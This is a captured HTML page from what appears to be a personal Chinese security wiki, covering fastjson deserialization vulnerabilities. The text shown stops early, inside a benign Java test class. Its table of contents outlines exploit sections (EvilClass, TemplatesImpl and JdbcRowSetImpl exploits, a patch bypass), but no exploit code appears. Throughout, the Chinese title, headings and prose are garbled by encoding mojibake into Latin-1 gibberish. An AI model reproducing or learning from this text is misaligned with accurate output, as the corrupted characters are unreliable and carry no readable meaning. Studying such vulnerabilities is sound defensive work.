<!doctype html>
<html lang="zh-CN" data-theme="light">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="generator" content="VuePress 2.0.0-rc.9" />
    <meta name="theme" content="VuePress Theme Hope 2.0.0-rc.33" />
    <style>
      html {
        background: var(--bg-color, #fff);
      }

      html[data-theme="dark"] {
        background: var(--bg-color, #1d1e1f);
      }

      body {
        background: var(--bg-color);
      }
    </style>
    <script>
      const userMode = localStorage.getItem("vuepress-theme-hope-scheme");
      const systemDarkMode =
        window.matchMedia &&
        window.matchMedia("(prefers-color-scheme: dark)").matches;

      if (userMode === "dark" || (userMode !== "light" && systemDarkMode)) {
        document.documentElement.setAttribute("data-theme", "dark");
      }
    </script>
    <meta property="og:url" content="https://github.com/zha0cai/SecWikiPublic/secwiki/codereview/%E3%80%90JavaSec%E3%80%91%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20(%E2%85%A0).html"><meta property="og:site_name" content="One-Piece"><meta property="og:title" content="fastjson ååºåˆ—åŒ– (â… )"><meta property="og:description" content="alibaba/fastjson: FASTJSON 2.0.x has been released, faster and more secure, recommend you upgrade. (github.com) ä»€ä¹ˆæ˜¯ fastjson Fastjson æ˜¯ä¸€ä¸ª Java åº“ï¼Œå¯ç”¨äºå°† Java å¯¹è±¡è½¬æ¢ä¸ºå…¶ JSON è¡¨ç¤ºå½¢å¼ã€‚å®ƒè¿˜å¯ç”¨äº..."><meta property="og:type" content="article"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="Mr.zha0cai"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"fastjson ååºåˆ—åŒ– (â… )","image":[""],"dateModified":null,"author":[{"@type":"Person","name":"Mr.zha0cai","url":"https://github.com/zha0cai"}]}</script><title>fastjson ååºåˆ—åŒ– (â… ) | One-Piece</title><meta name="description" content="alibaba/fastjson: FASTJSON 2.0.x has been released, faster and more secure, recommend you upgrade. (github.com) ä»€ä¹ˆæ˜¯ fastjson Fastjson æ˜¯ä¸€ä¸ª Java åº“ï¼Œå¯ç”¨äºå°† Java å¯¹è±¡è½¬æ¢ä¸ºå…¶ JSON è¡¨ç¤ºå½¢å¼ã€‚å®ƒè¿˜å¯ç”¨äº...">
    <link rel="stylesheet" href="/SecWikiPublic/secwiki/assets/css/styles.9ff32cca.css">
    <link rel="preload" href="/SecWikiPublic/secwiki/assets/js/runtime~app.6d43d119.js" as="script"><link rel="preload" href="/SecWikiPublic/secwiki/assets/css/styles.9ff32cca.css" as="style"><link rel="preload" href="/SecWikiPublic/secwiki/assets/js/335.fdc5cea6.js" as="script"><link rel="preload" href="/SecWikiPublic/secwiki/assets/js/app.9848b62a.js" as="script">
    <link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/PostgreSQL Attack.html.91a62648.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson ååºåˆ—åŒ– (â… ).html.0c343792.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CORS è·¨åŸŸæ¼æ´.html.e56cc8f2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/å›¾ç‰‡ XSS.html.eeb0e0e2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/URI ç›¸å…³çŸ¥è¯†.html.6d4665c2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/nodejs ä¸ nvmã€npmã€pnmpã€yarnã€corepack çš„å…³ç³».html.817dbbc8.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CSV æ³¨å…¥.html.882f01f7.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/photo-swipe.7839c4e7.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CDN æ”»å‡»æŒ‡å—.html.5700fa53.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/Java å†…çœï¼ˆIntrospectionï¼‰.html.dc61a88e.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/åˆ©ç”¨ TemplatesImpl æ‰§è¡Œå­—èŠ‚ç .html.df09ef44.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/Microsoft Windows MHTML è„šæœ¬ä»£ç æ³¨å…¥æ¼æ´.html.c437896d.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/giscus.f45acf91.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/xss2pdf-åˆ¶ä½œ.html.649d564a.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CRLF Injection.html.5f2ba8a6.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/index.html.1fde67b2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/EXAMPLE_README.html.7027e490.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/404.html.8e08ef19.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><!--[--><!--[--><span tabindex="-1"></span><a href="#main-content" class="vp-skip-link sr-only">è·³è‡³ä¸»è¦å…§å®¹</a><!--]--><div class="theme-container has-toc"><!--[--><header id="navbar" class="vp-navbar"><div class="vp-navbar-start"><button type="button" class="vp-toggle-sidebar-button" title="Toggle Sidebar"><span class="icon"></span></button><!--[--><!----><!--]--><!--[--><a class="route-link vp-brand" href="/SecWikiPublic/secwiki/"><img class="vp-nav-logo" src="https://avatars.githubusercontent.com/u/111300972?v=4" alt><!----><span class="vp-site-name hide-in-pad">One-Piece</span></a><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-center"><!--[--><!----><!--]--><!--[--><nav class="vp-nav-links"><div class="vp-nav-item hide-in-mobile"><a class="route-link nav-link" href="/SecWikiPublic/secwiki/" aria-label="One-Piece"><span class="font-icon icon fa-fw fa-sm fas fa-home" style=""></span>One-Piece<!----></a></div><div class="vp-nav-item hide-in-mobile"><a href="https://zha0cai.github.io/SecWikiPublic/secwiki/websec/" rel="noopener noreferrer" target="_blank" aria-label="WebSec" class="nav-link"><span class="font-icon icon fa-fw fa-sm fas fa-book" style=""></span>WebSec<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="vp-nav-item hide-in-mobile"><a href="https://zha0cai.github.io/SecWikiPublic/secwiki/redteam/" rel="noopener noreferrer" target="_blank" aria-label="RedTeam" class="nav-link"><span class="font-icon icon fa-fw fa-sm fas fa-robot" style=""></span>RedTeam<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="vp-nav-item hide-in-mobile"><a href="https://theme-hope.vuejs.press/zh/" rel="noopener noreferrer" target="_blank" aria-label="V2 å®˜æ–¹æ–‡æ¡£" class="nav-link"><span class="font-icon icon fa-fw fa-sm fas fa-book" style=""></span>V2 å®˜æ–¹æ–‡æ¡£<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div></nav><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-end"><!--[--><!----><!--]--><!--[--><!----><div class="vp-nav-item vp-action"><a class="vp-action-link" href="https://github.com/zha0cai" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="icon github-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="github icon" style="width:1.25rem;height:1.25rem;vertical-align:middle;"><path d="M511.957 21.333C241.024 21.333 21.333 240.981 21.333 512c0 216.832 140.544 400.725 335.574 465.664 24.49 4.395 32.256-10.07 32.256-23.083 0-11.69.256-44.245 0-85.205-136.448 29.61-164.736-64.64-164.736-64.64-22.315-56.704-54.4-71.765-54.4-71.765-44.587-30.464 3.285-29.824 3.285-29.824 49.195 3.413 75.179 50.517 75.179 50.517 43.776 75.008 114.816 53.333 142.762 40.79 4.523-31.66 17.152-53.377 31.19-65.537-108.971-12.458-223.488-54.485-223.488-242.602 0-53.547 19.114-97.323 50.517-131.67-5.035-12.33-21.93-62.293 4.779-129.834 0 0 41.258-13.184 134.912 50.346a469.803 469.803 0 0 1 122.88-16.554c41.642.213 83.626 5.632 122.88 16.554 93.653-63.488 134.784-50.346 134.784-50.346 26.752 67.541 9.898 117.504 4.864 129.834 31.402 34.347 50.474 78.123 50.474 131.67 0 188.586-114.73 230.016-224.042 242.09 17.578 15.232 33.578 44.672 33.578 90.454v135.85c0 13.142 7.936 27.606 32.854 22.87C862.25 912.597 1002.667 728.747 1002.667 512c0-271.019-219.648-490.667-490.71-490.667z"></path></svg></a></div><div class="vp-nav-item hide-in-mobile"><button type="button" id="appearance-switch"><svg xmlns="http://www.w3.org/2000/svg" class="icon auto-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="auto icon" style="display:block;"><path d="M512 992C246.92 992 32 777.08 32 512S246.92 32 512 32s480 214.92 480 480-214.92 480-480 480zm0-840c-198.78 0-360 161.22-360 360 0 198.84 161.22 360 360 360s360-161.16 360-360c0-198.78-161.22-360-360-360zm0 660V212c165.72 0 300 134.34 300 300 0 165.72-134.28 300-300 300z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon dark-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="dark icon" style="display:none;"><path d="M524.8 938.667h-4.267a439.893 439.893 0 0 1-313.173-134.4 446.293 446.293 0 0 1-11.093-597.334A432.213 432.213 0 0 1 366.933 90.027a42.667 42.667 0 0 1 45.227 9.386 42.667 42.667 0 0 1 10.24 42.667 358.4 358.4 0 0 0 82.773 375.893 361.387 361.387 0 0 0 376.747 82.774 42.667 42.667 0 0 1 54.187 55.04 433.493 433.493 0 0 1-99.84 154.88 438.613 438.613 0 0 1-311.467 128z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon light-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="light icon" style="display:none;"><path d="M952 552h-80a40 40 0 0 1 0-80h80a40 40 0 0 1 0 80zM801.88 280.08a41 41 0 0 1-57.96-57.96l57.96-58a41.04 41.04 0 0 1 58 58l-58 57.96zM512 752a240 240 0 1 1 0-480 240 240 0 0 1 0 480zm0-560a40 40 0 0 1-40-40V72a40 40 0 0 1 80 0v80a40 40 0 0 1-40 40zm-289.88 88.08-58-57.96a41.04 41.04 0 0 1 58-58l57.96 58a41 41 0 0 1-57.96 57.96zM192 512a40 40 0 0 1-40 40H72a40 40 0 0 1 0-80h80a40 40 0 0 1 40 40zm30.12 231.92a41 41 0 0 1 57.96 57.96l-57.96 58a41.04 41.04 0 0 1-58-58l58-57.96zM512 832a40 40 0 0 1 40 40v80a40 40 0 0 1-80 0v-80a40 40 0 0 1 40-40zm289.88-88.08 58 57.96a41.04 41.04 0 0 1-58 58l-57.96-58a41 41 0 0 1 57.96-57.96z"></path></svg></button></div><!----><!--]--><!--[--><!----><!--]--><button type="button" class="vp-toggle-navbar-button" aria-label="Toggle Navbar" aria-expanded="false" aria-controls="nav-screen"><span><span class="vp-top"></span><span class="vp-middle"></span><span class="vp-bottom"></span></span></button></div></header><!----><!--]--><!----><div class="toggle-sidebar-wrapper"><span class="arrow start"></span></div><aside id="sidebar" class="vp-sidebar"><!--[--><!----><!--]--><ul class="vp-sidebar-links"><li><a class="route-link nav-link vp-sidebar-link vp-sidebar-page" href="/SecWikiPublic/secwiki/" aria-label="One-Piece"><span class="font-icon icon fa-fw fa-sm fas fa-home" style=""></span>One-Piece<!----></a></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-book" style=""></span><span class="vp-sidebar-title">WebSec</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-robot" style=""></span><span class="vp-sidebar-title">RedTeam</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-robot" style=""></span><span class="vp-sidebar-title">ä»£ç å®¡è®¡</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-code" style=""></span><span class="vp-sidebar-title">Pwn</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-dev" style=""></span><span class="vp-sidebar-title">å®‰å…¨å¼€å‘</span><span class="vp-arrow end"></span></button><!----></section></li><li><a href="https://plugin-md-enhance.vuejs.press/zh/guide/content/revealjs/demo.html" rel="noopener noreferrer" target="_blank" aria-label="å¹»ç¯ç‰‡" class="nav-link vp-sidebar-link vp-sidebar-page"><span class="font-icon icon fa-fw fa-sm fas fa-person-chalkboard" style=""></span>å¹»ç¯ç‰‡<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></li></ul><!--[--><!----><!--]--></aside><!--[--><main id="main-content" class="vp-page"><!--[--><!--[--><!----><!--]--><!----><nav class="vp-breadcrumb disable"></nav><div class="vp-page-title"><h1><!---->fastjson ååºåˆ—åŒ– (â… )</h1><div class="page-info"><span class="page-author-info" aria-label="ä½œè€…ğŸ–Š" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon author-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="author icon"><path d="M649.6 633.6c86.4-48 147.2-144 147.2-249.6 0-160-128-288-288-288s-288 128-288 288c0 108.8 57.6 201.6 147.2 249.6-121.6 48-214.4 153.6-240 288-3.2 9.6 0 19.2 6.4 25.6 3.2 9.6 12.8 12.8 22.4 12.8h704c9.6 0 19.2-3.2 25.6-12.8 6.4-6.4 9.6-16 6.4-25.6-25.6-134.4-121.6-240-243.2-288z"></path></svg><span><a class="page-author-item" href="https://github.com/zha0cai" target="_blank" rel="noopener noreferrer">Mr.zha0cai</a></span><span property="author" content="Mr.zha0cai"></span></span><!----><!----><!----><span class="page-reading-time-info" aria-label="é˜…è¯»æ—¶é—´âŒ›" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon timer-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="timer icon"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z"></path></svg><span>å¤§çº¦ 30 åˆ†é’Ÿ</span><meta property="timeRequired" content="PT30M"></span><!----><!----></div><hr></div><div class="vp-toc-placeholder"><aside id="toc"><!--[--><!----><!--]--><div class="vp-toc-header">æ­¤é¡µå†…å®¹<button type="button" class="print-button" title="æ‰“å°"><svg xmlns="http://www.w3.org/2000/svg" class="icon print-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="print icon"><path d="M819.2 364.8h-44.8V128c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v236.8h-44.8C145.067 364.8 96 413.867 96 473.6v192c0 59.733 49.067 108.8 108.8 108.8h44.8V896c0 17.067 14.933 32 32 32h460.8c17.067 0 32-14.933 32-32V774.4h44.8c59.733 0 108.8-49.067 108.8-108.8v-192c0-59.733-49.067-108.8-108.8-108.8zM313.6 160h396.8v204.8H313.6V160zm396.8 704H313.6V620.8h396.8V864zM864 665.6c0 25.6-19.2 44.8-44.8 44.8h-44.8V588.8c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v121.6h-44.8c-25.6 0-44.8-19.2-44.8-44.8v-192c0-25.6 19.2-44.8 44.8-44.8h614.4c25.6 0 44.8 19.2 44.8 44.8v192z"></path></svg></button><div class="arrow end"></div></div><div class="vp-toc-wrapper"><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#ä»€ä¹ˆæ˜¯-fastjson">ä»€ä¹ˆæ˜¯ fastjson</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#æµ‹è¯•-demo">æµ‹è¯• Demo</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#ç–‘é—®ä¸€-æ˜ å°„å…³ç³»">ç–‘é—®ä¸€ï¼šæ˜ å°„å…³ç³»</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#ç–‘é—®äºŒ-é¡ºåºå…³ç³»">ç–‘é—®äºŒï¼šé¡ºåºå…³ç³»</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#ç–‘é—®ä¸‰-typeâ€‹">ç–‘é—®ä¸‰ï¼š@typeâ€‹</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#ååºåˆ—åŒ–">ååºåˆ—åŒ–</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#feature-supportnonpublicfield">Feature.SupportNonPublicField</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#parse-å’Œ-parseobject-åŒºåˆ«">Parse å’Œ ParseObject åŒºåˆ«</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#æ€»ç»“ä¸€">æ€»ç»“ä¸€</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#fastjson-ååºåˆ—åŒ–æµç¨‹">Fastjson ååºåˆ—åŒ–æµç¨‹</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#ååºåˆ—åŒ–ç±»å›¾">ååºåˆ—åŒ–ç±»å›¾</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#ååºåˆ—åŒ–ç‰¹ç‚¹">ååºåˆ—åŒ–ç‰¹ç‚¹</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#ååºåˆ—åŒ–åŸç†">ååºåˆ—åŒ–åŸç†</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#cve-2017-18349-fastjson-1-2-24">CVE-2017-18349ï¼ˆfastjson &lt;= 1.2.24ï¼‰</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#demo">Demo</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#evilclass">EvilClass</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#classtobase64">ClassToBase64</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#templatesimpl-exploit">TemplatesImpl Exploit</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#æ€»ç»“-1-1">æ€»ç»“ 1_1</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#jdbcrowsetimpl-exploit">JdbcRowSetImpl Exploit</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#å·¥å…·">å·¥å…·</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_1-2-25-è¡¥ä¸ç»•è¿‡åˆ†æ">1.2.25 è¡¥ä¸ç»•è¿‡åˆ†æ</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#è°ƒè¯•æŸ¥çœ‹">è°ƒè¯•æŸ¥çœ‹</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#autotypesupport">AutoTypeSupport</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#å‰äººæ ½æ ‘">å‰äººæ ½æ ‘</a></li><!----><!--]--></ul><div class="vp-toc-marker" style="top:-1.7rem;"></div></div><!--[--><!----><!--]--></aside></div><!--[--><!----><!--]--><div class="theme-hope-content"><blockquote><p><a href="https://github.com/alibaba/fastjson" target="_blank" rel="noopener noreferrer">alibaba/fastjson: FASTJSON 2.0.x has been released, faster and more secure, recommend you upgrade. (github.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><h2 id="ä»€ä¹ˆæ˜¯-fastjson" tabindex="-1"><a class="header-anchor" href="#ä»€ä¹ˆæ˜¯-fastjson"><span>ä»€ä¹ˆæ˜¯ fastjson</span></a></h2><p><a href="https://github.com/alibaba/fastjson" target="_blank" rel="noopener noreferrer">Fastjson<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> æ˜¯ä¸€ä¸ª Java åº“ï¼Œå¯ç”¨äºå°† Java å¯¹è±¡è½¬æ¢ä¸ºå…¶ JSON è¡¨ç¤ºå½¢å¼ã€‚å®ƒè¿˜å¯ç”¨äºå°† JSON å­—ç¬¦ä¸²è½¬æ¢ä¸ºç­‰æ•ˆçš„ Java å¯¹è±¡ã€‚ Fastjson å¯ä»¥å¤„ç†ä»»æ„ Java å¯¹è±¡ï¼ŒåŒ…æ‹¬æ‚¨æ²¡æœ‰æºä»£ç çš„ç°æœ‰å¯¹è±¡ã€‚</p><ul><li>Provide simple <code>toJSONString()</code>â€‹ and <code>parseObject()</code>â€‹ methods to convert Java objects to JSON and vice-versa</li><li>Allow pre-existing unmodifiable objects to be converted to and from JSON</li><li>Extensive support of Java Generics</li><li>Allow custom representations for objects</li><li>Support arbitrarily complex objects (with deep inheritance hierarchies and extensive use of generic types)</li></ul><p>ç®€å•æ¥è¯´å°±æ˜¯ä¸€ä¸ªåŠŸèƒ½ç‰¹æ€§æå…¶ä¸°å¯Œçš„ Json è§£æåº“ Java ç‰ˆã€‚</p><h2 id="ç¯å¢ƒæ­å»º" tabindex="-1"><a class="header-anchor" href="#ç¯å¢ƒæ­å»º"><span>ç¯å¢ƒæ­å»º</span></a></h2><ol><li>åœ¨ IDEA ä¸­æ–°å»ºä¸€ä¸ª maven é¡¹ç›®ï¼Œå¹¶å¼•å…¥ fastjson ä¾èµ–ã€‚</li><li>åœ¨ pom.xml ä¸­æ·»åŠ  fastjson ä¾èµ–å¹¶ <code>Reload All Maven Projects</code>â€‹ã€‚</li><li>åœ¨ <a href="https://mvnrepository.com/artifact/com.alibaba/fastjson" target="_blank" rel="noopener noreferrer">Maven Repository: com.alibaba Â» fastjson (mvnrepository.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> æœ‰æ‰€æœ‰çš„ç‰ˆæœ¬ä¾èµ–ä¿¡æ¯ã€‚</li></ol><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240410102212-68l5ov9.33f98da1.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240410103444-39u942g.ff29ed6f.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240410104138-99j2do1.dc3eaef9.png" alt="image" loading="lazy">â€‹</p><h2 id="æµ‹è¯•-demo" tabindex="-1"><a class="header-anchor" href="#æµ‹è¯•-demo"><span>æµ‹è¯• Demo</span></a></h2><p>åˆ›å»ºä¸€ä¸ª demo package å’Œä¸€ä¸ª Test ç±»ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240410105019-k4489mb.c9ea5c87.png" alt="image" loading="lazy">â€‹</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
    <span class="token doc-comment comment">/**
     * å®šä¹‰ä¸€ä¸ªç®€å•çš„é™æ€å†…éƒ¨ Java ç±»
     * 1. å¯ä»¥ç›´æ¥é€šè¿‡å¤–éƒ¨ç±»åæ¥è®¿é—®ï¼Œæ— éœ€å…ˆåˆ›å»ºå¤–éƒ¨ç±»çš„å®ä¾‹ã€‚
